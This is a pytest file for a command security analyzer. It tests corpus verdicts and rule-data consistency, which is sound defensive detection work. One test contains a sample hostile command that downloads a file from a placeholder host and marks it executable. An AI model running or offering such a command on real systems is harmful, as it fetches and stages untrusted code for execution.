"""Golden corpus and rule-data invariants for the command analyzer (ICM fix plan W3.6).

The corpus (tests/unit/tools/data/command_corpus.json) pins the verdict of
every entry, so a rule or threshold change shows up as a named entry moving,
not as a silent shift in false positives or misses.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from weebot.tools.bash_security import (
    LAYER1_RULES,
    LAYER2_COMBINATIONS,
    LAYER2_RULES,
    CommandSecurityAnalyzer,
)

_CORPUS = json.loads(
    (Path(__file__).parent / "data" / "command_corpus.json").read_text(encoding="utf-8")
)
_ENTRIES = [
    pytest.param(e["command"], e["expected"], id=f"{group}:{e['why'][:40]}")
    for group in ("malicious", "benign", "suspicious")
    for e in _CORPUS[group]
]


@pytest.mark.parametrize(("command", "expected"), _ENTRIES)
def test_corpus_verdict(command, expected):
    assessment = CommandSecurityAnalyzer().analyze(command)
    assert assessment.risk_level.value == expected, (
        f"{command!r}: expected {expected}, got {assessment.risk_level.value} "
        f"(layer {assessment.layer_triggered}: {assessment.reason})"
    )


def test_corpus_has_both_sides():
    assert len(_CORPUS["malicious"]) >= 10 and len(_CORPUS["benign"]) >= 10


class TestRuleData:
    def test_ids_are_unique(self):
        ids = [r.id for r in LAYER1_RULES + LAYER2_RULES]
        assert len(ids) == len(set(ids))

    def test_every_rule_compiles_and_names_its_layer(self):
        for rule in LAYER1_RULES + LAYER2_RULES:
            re.compile(rule.pattern)
            assert rule.id.startswith(f"l{rule.layer}."), rule.id
            assert rule.rationale

    def test_layer2_combinations_are_reachable(self):
        """Every indicator and target must be a token the layer-2 tokenizer can emit."""
        token = re.compile(r"[a-z][a-z0-9_-]*")
        for indicators, targets, _ in LAYER2_COMBINATIONS:
            for word in indicators | targets:
                assert token.fullmatch(word), f"{word!r} can never match a token"

    def test_invoke_webrequest_combination_now_fires(self):
        """`Invoke-WebRequest` was listed mixed-case against lower-case tokens."""
        result = CommandSecurityAnalyzer()._layer2_behavioral_analysis(
            "Invoke-WebRequest https://x.invalid/a -OutFile a; chmod 755 a"
        )
        assert result.risk_level.value == "dangerous"
